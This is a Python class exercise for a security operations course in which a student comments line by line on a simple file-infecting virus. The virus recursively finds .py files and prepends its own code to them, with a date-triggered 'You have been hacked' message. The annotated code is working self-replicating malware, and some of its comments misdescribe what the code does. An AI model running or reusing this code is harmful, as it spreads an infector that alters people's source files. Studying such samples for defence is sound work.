#!/usr/bin/python3

# Script: Ops 301 Class 14 Ops Challenge Solution
# Author: John Alona
# Date of latest revision: "03/30/2023"
# Purpose:

# Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
# Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
# Insert comments above the final three lines explaining how the functions are called and what this script appears to do.


import os #This is just importing the OS module to use in the script.
import datetime #same as os, it is just importing a module for datetime that will be used in the script.

SIGNATURE = "VIRUS" #Creating a new variable with "VIRUS" as a string

# Add "Virus" string to the paths it comes accross.
def locate(path): #Defining what locate is and uses path as its argument
    files_targeted = [] #variable which doesn't have any value and has a bracket open for modification.
    filelist = os.listdir(path) #variable using listdir function in the OS module in the path parameter.
    for fname in filelist:# Starts a loop for filelist
        if os.path.isdir(path+"/"+fname): #using the os.path modile,, this line is checking if (path+"/"+fname) is a directory
            files_targeted.extend(locate(path+"/"+fname))#locates the path+"/"+fname and adds it to files_targeted string or value.
        elif fname[-3:] == ".py": #here, it calls another conditional that when the last 3 characters of the file is equal to ".py".
            infected = False # infected variable is just given a false value
            for line in open(path+"/"+fname):#here it opens up the input value of (path+"/"+fname) 
                if SIGNATURE in line:# If the string "Virus" is found when reading the lines in (path+"/"+fname) 
                    infected = True # gives the infected a true value
                    break # breaks the script 
            if infected == False: #If the value is still falls
                files_targeted.append(path+"/"+fname)# adds the (path+"/"+fname) to the list of files.targeted which was empty.
    return files_targeted #returns list (path+"/"+fname) to thje files_targeted variable
#Appends the file with the virrusstring
def infect(files_targeted): #defines infect value from the files_targeted variable from the above script.
    virus = open(os.path.abspath(__file__))# opens the current file of the script using a variable
    virusstring = "" #variable with an open string.
    for i,line in enumerate(virus):# enumerates the lines in the virus file.
        if 0 <= i < 39:# If statement for 0 is less than i which is from the lines from the virus file.
            virusstring += line#adds the lines from virus file.
    virus.close#closes the virus file.
    for fname in files_targeted:#files names on the file_targeted variable
        f = open(fname)#creates a f variable to open fname
        temp = f.read()#creates another variable that opens and reads the f variable.
        f.close()#closes the f variable
        f = open(fname,"w")#creates a variable which creates the fname file.
        f.write(virusstring + temp) #creates a file and writes the value of virrusstring and temp in it
        f.close()#closes the f variable.
#Prints a string if the date is the 5th month and is the 9th day of that month.
def detonate():#defines the detonate function
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:#checks if it is the 5th month of the year and 9th days of the month
        print("You have been hacked")#print this string if the month and day is of same value.

files_targeted = locate(os.path.abspath(""))#variable getting an open string absolute path
infect(files_targeted)#initiates the infect function on to the files_targeted variable
detonate()#initiates detonate function

